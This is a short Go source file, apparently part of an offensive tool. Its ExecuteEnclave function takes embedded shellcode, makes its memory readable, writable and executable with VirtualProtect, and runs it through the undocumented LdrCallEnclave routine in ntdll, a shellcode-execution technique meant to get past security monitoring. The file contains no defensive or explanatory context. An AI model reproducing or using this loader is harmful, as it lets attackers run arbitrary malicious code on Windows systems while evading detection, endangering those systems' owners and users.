package sh

import (
	"fmt"
	"unsafe"
	api "github.com/carved4/go-wincall"
)	


func ExecuteEnclave() error {
	shellcode := GetEmbeddedShellcode()
	
	var oldProtect uint32
	shellcodePtr := uintptr(unsafe.Pointer(&shellcode[0]))
	
	success, err := api.Call("kernel32.dll", "VirtualProtect",
		shellcodePtr,           		// lpAddress
		uintptr(len(shellcode)),        // dwSize
		0x40,                           // PAGE_EXECUTE_READWRITE
		uintptr(unsafe.Pointer(&oldProtect)), // lpflOldProtect
	)
	if err != nil || success == 0 {
		return fmt.Errorf("VirtualProtect failed: %v", err)
	}
	
	var returnParam unsafe.Pointer  // LPVOID _t; in C
	
	_, err = api.Call("ntdll.dll", "LdrCallEnclave",
		shellcodePtr,                           // (LPENCLAVE_ROUTINE) which is ourshellcode  
		uintptr(uint32(0)),                     // false (explicitly cast to match ULONG)
		uintptr(unsafe.Pointer(&returnParam)), // &_t (pointer to LPVOID)
	)
	if err != nil {
		return fmt.Errorf("LdrCallEnclave failed: %v", err)
	}
	
	return nil
}

